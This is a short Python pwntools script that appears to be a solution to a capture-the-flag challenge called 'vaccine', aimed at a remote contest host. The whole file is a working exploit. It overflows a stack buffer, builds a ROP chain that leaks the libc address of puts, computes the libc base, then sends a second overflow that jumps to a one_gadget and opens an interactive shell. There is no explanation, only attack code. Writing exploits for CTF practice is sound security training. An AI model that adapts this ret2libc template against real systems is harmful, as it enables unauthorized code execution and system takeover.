from pwn import *
elf = ELF("vaccine")
libc = ELF("libc-2.31.so")
context.log_level = "debug"
ip,port = "vaccine.chal.ctf.acsc.asia",1337

if len(sys.argv) > 1 and sys.argv[1] == "-gdb":
    r = gdb.debug(elf.path)
elif len(sys.argv) > 1 and sys.argv[1] == "-r":
    r = remote(ip, port)
else:
    r = process(elf.path)

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

puts_offset = int(libc.symbols["puts"])
pop_rdi = p64(0x0000000000401443)
pop_rsi = p64(0x0000000000401441)

main = elf.symbols["main"]
puts_plt = elf.plt["puts"]
got_puts = elf.got["puts"]

payload = pop_rdi + p64(got_puts) + p64(puts_plt) + p64(main)

sla(": ",b"\x00"*113 + b"A"*151 + payload)
rl()
rl()
libc.address = int(unpack(r.recv(6),48)) - puts_offset
one_gadget = p64(libc.address + 0xe3b01)
sla(": ",b"\x00"*113 + b"A"*151 + one_gadget)

r.interactive()